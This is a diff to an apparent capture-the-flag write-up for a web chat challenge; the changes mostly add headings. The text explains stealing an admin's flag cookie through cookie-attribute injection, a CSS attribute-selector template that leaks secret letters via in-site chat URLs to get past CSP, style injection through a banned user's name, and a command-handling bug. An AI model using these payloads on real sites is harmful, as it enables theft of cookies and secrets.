@@ -18,7 +18,8 @@ If we use `/report` command admin comes to the chat, and leaves after a moment.
 If any of the users meanwhile says `dog`, this user will get banned.
 Ban is implemented only client-side, managed by a cookie, so we can un-ban our user simply by removing the cookie.
 
-From the sources the first important part is the location of the flag, visible in the source code of the server code for handling `/secret` command:
+## From the sources 
+the first important part is the location of the flag, visible in the source code of the server code for handling `/secret` command:
 
 ```javascript
       case '/secret':
@@ -31,6 +32,8 @@ If someone issues this command, then server sends a cookie `flag` with a designa
 From the description of the command we can guess that admin already has this cookie set, so our goal is to steal the cookie.
 We notice here that there is a injection that allows us to add more parameters to the cookie header, so theoretically we could set secret with value `; Path=/whatever;` and thus overwrite the original intended cookie Path parameter.
 This is useful, because it means we could use `/secret something; domain=gooe.com` to avoid setting a new cookie, so we won't overwrite the original flag someone might have stored in the cookie.
+
+## XSS
 Stealing cookie would seem like a classic XSS task, however if we check the `Content Security Policy` header we can see that the whole application has:
 
 ```
@@ -60,16 +63,17 @@ If we could inject CSS style somewhere on the page, we could place:
 span[data-secret^={letter} i]{{background: url({some_url}?msg={letter})}}
 ``` 
 
+## CSRF
 Every user for whom this style is applied, would make a request on URL we provide, assuming the secret data match the letter we selected.
 In our case we can't use just any URL, because CSP will not allow sending the request "outside", but fortunately we can use url `/room/{room_id}/send?name=leaker&msg={letter}` and the data will appear as message on the chat in the room we select.
 We can make a lot of those style entries, one for each letter of the flags charset, and thus recover the first letter of the secret.
 Then we can simply match two letters, then three etc.
 
-We're now left with two problems:
+## We're now left with two problems:
 - We have to find a way to inject the CSS on the page
 - We have to find a way to convince admin to issue `/secret` command.
 
-Solution to the first problem can be found in the code handling banned users:
+#### Solution to the first problem can be found in the code handling banned users:
 
 ```javascript
     ban(data) {
@@ -94,6 +98,7 @@ We can, therefore, use a name which closes the opening style tags and adds new o
 This way we can inject exfiltration CSS code, which will get triggered if any of users present on the chat have the secret displayed on the screen and it starts with `C`.
 The only thing we need to trigger this is to call an admin and convince him to ban the user.
 
+## convince admin to issue `/secret` command
 Now we come to the last issue, how to convince admin to issue `/secret` command.
 This is a bit funny, because we've seen in writeups of some other teams, that they got this part all wrong, and their solution worked purely by accident.
 
@@ -111,7 +116,7 @@ The reason is quite trivial really, if we look at the sever code for handling th
 There is no broadcast here!
 The response is never send via SSE, and therefore it will not get handled on the client side by the event handler which causes the secret to be added to DOM of the page.
 
-So how come it actually worked for some other teams?
+## So how come it actually worked for some other teams?
 Pure coincidence.
 The real vulnerability is in the event handling function on the server side:
 
@@ -152,7 +157,7 @@ We can see that we can easily set a special name which contains `/secret somethi
 This is the reason why it worked for so many teams. 
 It had nothing to do with forcing admin to load a style from `/room/{room_id}/send?name=admin&msg=/secret xx` when banning a user, but simply the ban command contained the `/secret xx` string, and thus the command got executed by the handler on server side.
 
-Our attack approach at this point is quite clear:
+## Our attack approach at this point is quite clear:
 
 1. Create a user named `/secret something; domain=gooe.com`
 2. Create a user with CSS exfiltration name.
